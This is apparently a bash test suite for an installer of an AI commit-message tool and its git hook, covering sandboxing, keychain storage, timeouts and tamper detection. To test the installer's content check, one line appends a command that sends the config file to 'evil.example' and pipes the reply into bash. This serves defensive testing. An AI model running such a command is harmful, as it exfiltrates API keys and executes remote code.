#!/usr/bin/env bash
#
# Tests install-git-commit-ai.sh and the hook. Runs with bash 3.2 or later on
# Linux, macOS and Windows (Git Bash).
#
# Usage: bash tests/run.sh
#
# The tests use a sandbox: a temporary home directory, a stand-in for cmai
# (tests/fixtures/cmai) and a keychain entry with a test name. They change
# nothing in your home directory.
#
# Keychain:
# - Linux: the tests start a private D-Bus session with a temporary keyring and
#   never reach your keyring. This needs secret-tool, dbus-run-session and
#   gnome-keyring-daemon. Without these tools, the tests check the key file.
# - macOS: the tests make a temporary keychain in the temporary home directory
#   and never reach your keychains.
# - Windows: the tests add one entry with a test name to the Credential Manager
#   and remove it at the end.
# Set GCAI_EXPECT_KEYCHAIN=1 to fail if no keychain is available, as the
# continuous integration does.

set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
INSTALLER="${ROOT}/install-git-commit-ai.sh"
FIXTURE="${ROOT}/tests/fixtures/cmai/git-commit.sh"
TEST_KEY='test-key-0123456789'

# ----------------------------------------------------------------------------
# Linux: move into a private D-Bus session with a temporary keyring.
# ----------------------------------------------------------------------------
case "${OSTYPE:-}" in
  linux*)
    if [ -z "${GCAI_TEST_SESSION:-}" ]; then
      if command -v secret-tool >/dev/null 2>&1 && command -v dbus-run-session >/dev/null 2>&1 &&
        command -v gnome-keyring-daemon >/dev/null 2>&1; then
        # A short path, because the path of a socket has a length limit.
        session_dir="$(mktemp -d /tmp/gcai.XXXXXX)"
        mkdir -p "${session_dir}/runtime" "${session_dir}/data" "${session_dir}/home"
        chmod 700 "${session_dir}/runtime"
        status=0
        # A clean environment: no variable of the real session reaches the tests.
        env -i PATH="${PATH}" HOME="${session_dir}/home" LANG="${LANG:-C.UTF-8}" TERM="${TERM:-dumb}" \
          GCAI_TEST_SESSION=keyring GCAI_EXPECT_KEYCHAIN="${GCAI_EXPECT_KEYCHAIN:-}" \
          XDG_RUNTIME_DIR="${session_dir}/runtime" XDG_DATA_HOME="${session_dir}/data" \
          dbus-run-session -- "${BASH}" "${BASH_SOURCE[0]}" "$@" || status=$?
        rm -rf "${session_dir}"
        exit "${status}"
      fi
      # No private keyring: make sure that the tests cannot reach your keyring.
      export GCAI_TEST_SESSION=none
      unset DBUS_SESSION_BUS_ADDRESS GNOME_KEYRING_CONTROL DISPLAY WAYLAND_DISPLAY
      XDG_RUNTIME_DIR="$(mktemp -d)"
      export XDG_RUNTIME_DIR
    elif [ "${GCAI_TEST_SESSION}" = keyring ]; then
      printf 'test-password' | gnome-keyring-daemon --daemonize --unlock --components=secrets >/dev/null
    fi
    ;;
esac

# ----------------------------------------------------------------------------
# Sandbox
# ----------------------------------------------------------------------------
unset MITTWALD_AI_API_KEY CMAI_API_KEY XDG_CONFIG_HOME GIT_DIR GIT_WORK_TREE GIT_CONFIG_GLOBAL \
  EDITOR VISUAL NO_COLOR FAKE_CMAI_MODE FAKE_CMAI_HEARTBEAT

SANDBOX="$(mktemp -d)"
export HOME="${SANDBOX}/home"
export CMAI_BIN_DIR="${SANDBOX}/bin"
export CMAI_REPO="${SANDBOX}/cmai-repo"
export CMAI_KEYCHAIN_ENTRY="git-commit-ai-test-$$"
export GIT_CONFIG_NOSYSTEM=1
export GIT_EDITOR=true
mkdir -p "${HOME}" "${CMAI_BIN_DIR}"

# A PATH without any cmai of yours. The directory of this bash comes first, so
# that the hook runs with the same bash as the tests.
clean_path=''
IFS=: read -r -a path_dirs <<< "${PATH}"
for dir in "${path_dirs[@]}"; do
  if [ -n "${dir}" ] && [ ! -e "${dir}/cmai" ]; then
    clean_path="${clean_path:+${clean_path}:}${dir}"
  fi
done
PATH="${CMAI_BIN_DIR}:$(dirname "${BASH}"):${clean_path}"
export PATH

# shellcheck source-path=SCRIPTDIR source=../install-git-commit-ai.sh
source "${INSTALLER}"
setup_colors
detect_platform

TEST_KEYCHAIN=''
LOG="${SANDBOX}/install.log"
TEMPLATE_HOOK="${HOME}/.git-templates/hooks/prepare-commit-msg"
KEY_FILE="${HOME}/.config/git-commit-ai/config"
passed=0

cleanup_tests() {
  keychain_delete >/dev/null 2>&1 || true
  if [ -n "${TEST_KEYCHAIN}" ]; then
    security delete-keychain "${TEST_KEYCHAIN}" >/dev/null 2>&1 || true
  fi
  rm -rf "${SANDBOX}"
}
trap cleanup_tests EXIT

# macOS finds its keychains through HOME. The tests make a keychain of their
# own there, as the default keychain of the temporary home directory.
if [ "${PLATFORM}" = macos ]; then
  # Guard: if security showed a keychain outside the sandbox here, the next
  # commands would change the settings of your real keychains.
  case "$(security default-keychain 2>&1 || true)" in
    *"${SANDBOX}"*|*"could not be found"*|'')
      # Not the name login.keychain-db: macOS unlocks a login keychain with
      # the password of the user account.
      TEST_KEYCHAIN="${HOME}/Library/Keychains/tests.keychain-db"
      mkdir -p "${HOME}/Library/Keychains" "${HOME}/Library/Preferences"
      security create-keychain -p test-password "${TEST_KEYCHAIN}"
      security set-keychain-settings -lut 21600 "${TEST_KEYCHAIN}"
      # A new keychain is unlocked. The command makes sure of it.
      security unlock-keychain -p test-password "${TEST_KEYCHAIN}" ||
        echo "note: security unlock-keychain failed; the tests continue with the new keychain"
      security list-keychains -d user -s "${TEST_KEYCHAIN}"
      security default-keychain -d user -s "${TEST_KEYCHAIN}"
      ;;
    *)
      echo "security does not use the temporary home directory. The tests leave the keychain alone."
      keychain_exists() { return 1; }
      ;;
  esac
fi

pass() {
  passed=$((passed + 1))
  printf 'ok    %s\n' "$1"
}

# $1 = description, $2 = file to show
fail() {
  printf 'FAIL  %s\n' "$1" >&2
  if [ -n "${2:-}" ] && [ -f "$2" ]; then
    sed 's/^/      /' "$2" >&2
  fi
  exit 1
}

# $1 = description, then the command that must succeed
check() {
  local description="$1"
  shift
  if "$@"; then
    pass "${description}"
  else
    fail "${description}" "${LOG}"
  fi
}

contains() {
  grep -qF -e "$2" "$1"
}

# Runs the installer without prompts. The output goes to the log. $@ = options.
run_installer() {
  "${BASH}" "${INSTALLER}" --non-interactive "$@" > "${LOG}" 2>&1 < /dev/null
}

installer_fails() {
  ! run_installer
}

installer_fails_with() {
  ! run_installer "$@"
}

# Makes the repository that the installer downloads cmai from. $1 = script.
make_cmai_repo() {
  rm -rf "${CMAI_REPO}"
  git init -q "${CMAI_REPO}"
  cp "$1" "${CMAI_REPO}/git-commit.sh"
  git -C "${CMAI_REPO}" add git-commit.sh
  git -C "${CMAI_REPO}" -c user.name=Test -c user.email=test@example.invalid commit -q -m cmai
}

remove_cmai() {
  rm -rf "${HOME}/git-commit-ai" "${CMAI_BIN_DIR}/cmai"
}

# Makes a repository with one staged file. `git init` copies the hook from the
# template directory. $1 = directory.
make_repo() {
  rm -rf "$1"
  git init -q "$1"
  git -C "$1" config user.name Test
  git -C "$1" config user.email test@example.invalid
  echo content > "$1/file.txt"
  git -C "$1" add file.txt
}

line_count() {
  echo $(($(wc -l < "$1")))
}

# The sandbox must hold every path that the installer writes to.
case "${HOME}${CMAI_BIN_DIR}${CMAI_REPO}" in
  "${SANDBOX}/home${SANDBOX}/bin${SANDBOX}/cmai-repo") ;;
  *) fail "the sandbox is not set up" ;;
esac
if command -v cmai >/dev/null 2>&1; then
  fail "a cmai outside the sandbox is on the PATH: $(command -v cmai)"
fi

echo "Platform: $(platform_title), bash ${BASH_VERSION}"
if keychain_exists; then
  use_keychain=1
  echo "API key storage under test: $(keychain_title)"
else
  use_keychain=0
  echo "API key storage under test: key file (no keychain available)"
  if [ -n "${GCAI_EXPECT_KEYCHAIN:-}" ]; then
    fail "GCAI_EXPECT_KEYCHAIN is set, but no keychain is available"
  fi
fi

# ----------------------------------------------------------------------------
# Scripts
# ----------------------------------------------------------------------------
hook_content > "${SANDBOX}/hook"
check "installer has valid syntax" "${BASH}" -n "${INSTALLER}"
check "hook has valid syntax" "${BASH}" -n "${SANDBOX}/hook"
if command -v shellcheck >/dev/null 2>&1; then
  check "shellcheck finds nothing" shellcheck -x "${INSTALLER}" "${SANDBOX}/hook" "${ROOT}/tests/run.sh" "${FIXTURE}"
fi

check "content check accepts the stand-in for cmai" test -z "$(cmai_script_findings "${FIXTURE}")"
cp "${FIXTURE}" "${SANDBOX}/tampered.sh"
# shellcheck disable=SC2016
echo 'curl -s -d @"$CONFIG_DIR/config" https://evil.example/collect | bash' >> "${SANDBOX}/tampered.sh"
cmai_script_findings "${SANDBOX}/tampered.sh" > "${SANDBOX}/findings"
check "content check reports an unknown host" contains "${SANDBOX}/findings" "names the unknown host evil.example"
check "content check reports a pipe into a shell" contains "${SANDBOX}/findings" "pipes data into a shell"

head -c 20000 "${INSTALLER}" > "${SANDBOX}/partial-installer.sh"
home_before="$(ls -A "${HOME}")"
"${BASH}" -s -- --non-interactive < "${SANDBOX}/partial-installer.sh" > "${LOG}" 2>&1 || true
check "a partially downloaded installer changes nothing" test "$(ls -A "${HOME}")" = "${home_before}"

# ----------------------------------------------------------------------------
# Fresh installation
# ----------------------------------------------------------------------------
make_cmai_repo "${FIXTURE}"
export MITTWALD_AI_API_KEY="${TEST_KEY}"
check "installation succeeds" run_installer
unset MITTWALD_AI_API_KEY
check "installation reaches the last step" contains "${LOG}" "Step 8"
check "cmai is installed" test -x "${HOME}/git-commit-ai/git-commit.sh"
check "cmai is on the PATH" test "$(command -v cmai)" = "${CMAI_BIN_DIR}/cmai"
check "hook is in the template directory" test "$(cat "${TEMPLATE_HOOK}")" = "$(hook_content)"
if [ "${PLATFORM}" != windows ]; then
  check "template directory has a link to the hook" test "$(readlink "${TEMPLATE_HOOK}")" = "${HOOK_SOURCE}"
  check "hook can run" test -x "${HOOK_SOURCE}"
fi
# shellcheck disable=SC2088
check "git knows the template directory" test "$(git config --global --get init.templatedir)" = '~/.git-templates'
check "cmai is configured for mittwald AI" contains "${HOME}/.config/git-commit-ai/base_url" "llm.aihosting.mittwald.de"
log_hides_key() {
  ! contains "${LOG}" "${TEST_KEY}"
}
check "the log does not show the API key" log_hides_key

if [ "${use_keychain}" -eq 1 ]; then
  check "API key is in the keychain" test "$(keychain_get)" = "${TEST_KEY}"
  check "hook can find the keychain entry" test "$(cat "${KEYCHAIN_FILE}")" = "${CMAI_KEYCHAIN_ENTRY}"
  check "API key is not in a file" test ! -e "${KEY_FILE}"
else
  check "API key is in the key file" test "$(cat "${KEY_FILE}")" = "${TEST_KEY}"
  if [ "${PLATFORM}" != windows ]; then
    # shellcheck disable=SC2012
    check "only the user can read the key file" test "$(ls -l "${KEY_FILE}" | cut -c 1-10)" = "-rw-------"
  fi
fi

# ----------------------------------------------------------------------------
# Hook
# ----------------------------------------------------------------------------
REPO="${SANDBOX}/repo"
make_repo "${REPO}"
check "git init copies the hook into a repository" test -f "${REPO}/.git/hooks/prepare-commit-msg"
if [ "${PLATFORM}" != windows ]; then
  check "git init copies the link" test "$(readlink "${REPO}/.git/hooks/prepare-commit-msg")" = "${HOOK_SOURCE}"
fi

commit() {
  (cd "${REPO}" && git commit) > "${LOG}" 2>&1 < /dev/null
}
commit_fails() {
  ! commit
}

check "commit with a generated message succeeds" commit
check "commit has the generated subject" test "$(git -C "${REPO}" log -1 --format=%s)" = "feat(test): generated message"
git -C "${REPO}" log -1 --format=%b > "${SANDBOX}/body"
check "cmai gets the API key" contains "${SANDBOX}/body" "api-key=${TEST_KEY}"

make_repo "${REPO}"
(cd "${REPO}" && PATH="$(dirname "${BASH}"):${clean_path}" git commit) > "${LOG}" 2>&1 < /dev/null || true
check "hook finds cmai without the PATH" test "$(git -C "${REPO}" log -1 --format=%s 2>/dev/null)" = "feat(test): generated message"

make_repo "${REPO}"
export FAKE_CMAI_MODE=fail
check "commit without a message stops when cmai fails" commit_fails
check "hook reports that cmai failed" contains "${LOG}" "No commit message generated: cmai failed (exit 1)"
check "hook shows the error of cmai" contains "${LOG}" "API request failed (HTTP 401): invalid key"

# A hook with short time limits: 1 second, then 2 seconds. The hook of the
# repository is a link; remove it so that sed does not write into the hook.
rm -f "${REPO}/.git/hooks/prepare-commit-msg"
sed -e 's/^TIMEOUT_SECONDS=30 /TIMEOUT_SECONDS=1 /' -e 's/^MAX_ATTEMPTS=3/MAX_ATTEMPTS=2/' \
  "${TEMPLATE_HOOK}" > "${REPO}/.git/hooks/prepare-commit-msg"
chmod +x "${REPO}/.git/hooks/prepare-commit-msg"
export FAKE_CMAI_MODE=hang
export FAKE_CMAI_HEARTBEAT="${SANDBOX}/heartbeat"
: > "${FAKE_CMAI_HEARTBEAT}"
check "commit without a message stops when cmai hangs" commit_fails
check "hook reports the time limit" contains "${LOG}" "cmai timed out after 2s (attempt 2/2)"
beats="$(line_count "${FAKE_CMAI_HEARTBEAT}")"
sleep 1
check "hook stops cmai and its child process" test "$(line_count "${FAKE_CMAI_HEARTBEAT}")" = "${beats}"
check "cmai ran until the time limit" test "${beats}" -gt 2
unset FAKE_CMAI_MODE FAKE_CMAI_HEARTBEAT

# ----------------------------------------------------------------------------
# Second run and other states
# ----------------------------------------------------------------------------
# The second run reads the installer from a pipe, as `curl ... | bash` does.
run_installer_from_pipe() {
  "${BASH}" -s -- --non-interactive < "${INSTALLER}" > "${LOG}" 2>&1
}
check "second installation succeeds from a pipe" run_installer_from_pipe
check "second installation keeps the hook" contains "${LOG}" "is already up to date"
check "second installation finds that cmai is the latest" contains "${LOG}" "is the latest version"

# A newer cmai in the repository
cp "${FIXTURE}" "${SANDBOX}/newer-cmai.sh"
echo '# a newer version' >> "${SANDBOX}/newer-cmai.sh"
make_cmai_repo "${SANDBOX}/newer-cmai.sh"
check "installation with a newer cmai succeeds" run_installer
check "installation reports the newer cmai" contains "${LOG}" "A newer cmai is available"
check "newer cmai is installed" contains "${HOME}/git-commit-ai/git-commit.sh" "# a newer version"
check "cmai on the PATH is the newer one" contains "${CMAI_BIN_DIR}/cmai" "# a newer version"

# A newer cmai with unexpected content
make_cmai_repo "${SANDBOX}/tampered.sh"
check "installation with a newer cmai with unexpected content succeeds" run_installer
check "installation lists the unexpected content of the newer cmai" contains "${LOG}" "does not look as expected"
check "installed cmai is kept" contains "${HOME}/git-commit-ai/git-commit.sh" "# a newer version"
installed_cmai_is_clean() {
  ! contains "${HOME}/git-commit-ai/git-commit.sh" "evil.example"
}
check "newer cmai with unexpected content is not installed" installed_cmai_is_clean

# No connection to the repository of cmai
real_cmai_repo="${CMAI_REPO}"
export CMAI_REPO="${SANDBOX}/missing-repo"
check "installation without a connection to the cmai repository succeeds" run_installer
check "installation reports the failed download" contains "${LOG}" "failed to download cmai"
check "installed cmai is kept without a connection" contains "${HOME}/git-commit-ai/git-commit.sh" "# a newer version"
export CMAI_REPO="${real_cmai_repo}"
make_cmai_repo "${FIXTURE}"
check "installation goes back to the cmai of the repository" run_installer
if [ "${use_keychain}" -eq 1 ]; then
  check "second installation keeps the key in the keychain" test "$(keychain_get)" = "${TEST_KEY}"
else
  check "second installation keeps the key file" test "$(cat "${KEY_FILE}")" = "${TEST_KEY}"
fi

# Remove the link first, so that the next lines do not write into the hook.
rm -f "${TEMPLATE_HOOK}"
printf '#!/bin/sh\necho "hook of the user"\n' > "${TEMPLATE_HOOK}"
check "installation stops at a hook from another source" installer_fails
check "installation names the reason" contains "${LOG}" "was not written by this installer"
check "hook from another source is kept" contains "${TEMPLATE_HOOK}" "hook of the user"

rm -f "${TEMPLATE_HOOK}"
printf '#!/bin/sh\nexec cmai --message-only\n' > "${TEMPLATE_HOOK}"
check "installation updates an older hook of this installer" run_installer
check "older hook is replaced" test "$(cat "${TEMPLATE_HOOK}")" = "$(hook_content)"
if [ "${PLATFORM}" != windows ]; then
  check "older hook is replaced with a link" test "$(readlink "${TEMPLATE_HOOK}")" = "${HOOK_SOURCE}"
fi

# ----------------------------------------------------------------------------
# Hooks in existing repositories
# ----------------------------------------------------------------------------
REPOS="${SANDBOX}/repos"
rm -rf "${REPOS}"
# A copy of the hook from an older installer, a hook from another source and
# a repository without the hook.
make_repo "${REPOS}/group/old-copy"
rm -f "${REPOS}/group/old-copy/.git/hooks/prepare-commit-msg"
printf '#!/bin/sh\nexec cmai --message-only\n' > "${REPOS}/group/old-copy/.git/hooks/prepare-commit-msg"
make_repo "${REPOS}/other-hook"
rm -f "${REPOS}/other-hook/.git/hooks/prepare-commit-msg"
printf '#!/bin/sh\necho "hook of the user"\n' > "${REPOS}/other-hook/.git/hooks/prepare-commit-msg"
make_repo "${REPOS}/no-hook"
rm -f "${REPOS}/no-hook/.git/hooks/prepare-commit-msg"
# A repository with its own hooks directory.
make_repo "${REPOS}/own-hooks-path"
git -C "${REPOS}/own-hooks-path" config core.hooksPath .githooks
rm -f "${REPOS}/own-hooks-path/.git/hooks/prepare-commit-msg"
printf '#!/bin/sh\nexec cmai --message-only\n' > "${REPOS}/own-hooks-path/.git/hooks/prepare-commit-msg"

check "installation with --repos succeeds" run_installer --repos "${REPOS}"
check "installation lists the old copy" contains "${LOG}" "old-copy/.git/hooks/prepare-commit-msg"
check "old copy has the current hook" test "$(cat "${REPOS}/group/old-copy/.git/hooks/prepare-commit-msg")" = "$(hook_content)"
if [ "${PLATFORM}" != windows ]; then
  check "old copy is replaced with a link" test "$(readlink "${REPOS}/group/old-copy/.git/hooks/prepare-commit-msg")" = "${HOOK_SOURCE}"
fi
check "hook from another source in a repository is kept" contains "${REPOS}/other-hook/.git/hooks/prepare-commit-msg" "hook of the user"
check "repository without the hook stays without it" test ! -e "${REPOS}/no-hook/.git/hooks/prepare-commit-msg"
check "repository with its own core.hooksPath is left alone" contains "${REPOS}/own-hooks-path/.git/hooks/prepare-commit-msg" "exec cmai --message-only"
check "second installation with --repos succeeds" run_installer --repos "${REPOS}"
check "second installation finds no old copy" contains "${LOG}" "No repository has an old copy of the hook (1 "
check "--repos without a directory fails" installer_fails_with --repos

if [ "${use_keychain}" -eq 1 ]; then
  # A key in the key file, as an installation before the keychain support left it.
  keychain_delete
  rm -f "${KEYCHAIN_FILE}"
  printf '%s\n' "${TEST_KEY}" > "${KEY_FILE}"
  check "installation with a key file succeeds" run_installer
  check "key moves from the key file into the keychain" test "$(keychain_get)" = "${TEST_KEY}"
  check "key file is removed" test ! -e "${KEY_FILE}"

  # A cmai that cannot take the key from the environment.
  remove_cmai
  sed 's/CMAI_API_KEY/OTHER_VARIABLE/g' "${FIXTURE}" > "${SANDBOX}/cmai-without-environment.sh"
  make_cmai_repo "${SANDBOX}/cmai-without-environment.sh"
  check "installation of a cmai without key from the environment succeeds" run_installer
  check "key moves back into the key file" test "$(cat "${KEY_FILE}")" = "${TEST_KEY}"
  check "hook stops reading the keychain" test ! -e "${KEYCHAIN_FILE}"
  check "next installation succeeds" run_installer
  check "installer finds that the installed cmai is the latest" contains "${LOG}" "is the latest version"
  check "installer keeps a cmai that is the latest" contains "${LOG}" "The latest cmai cannot do this either"
  check "key stays in the key file" test "$(cat "${KEY_FILE}")" = "${TEST_KEY}"
fi

# cmai from a repository with unexpected content
remove_cmai
make_cmai_repo "${SANDBOX}/tampered.sh"
check "installation stops at a cmai with unexpected content" installer_fails
check "installation lists the unexpected content" contains "${LOG}" "does not look as expected"
check "cmai with unexpected content is not installed" test ! -e "${HOME}/git-commit-ai/git-commit.sh"

# An old cmai on the PATH
make_cmai_repo "${FIXTURE}"
sed 's/--extra-body)/--other-option)/' "${FIXTURE}" > "${CMAI_BIN_DIR}/cmai"
chmod +x "${CMAI_BIN_DIR}/cmai"
check "installation updates an old cmai" run_installer
check "installation names the update" contains "${LOG}" "Update cmai"
check "old cmai is replaced" contains "${CMAI_BIN_DIR}/cmai" "--extra-body"

echo
echo "All ${passed} checks passed."
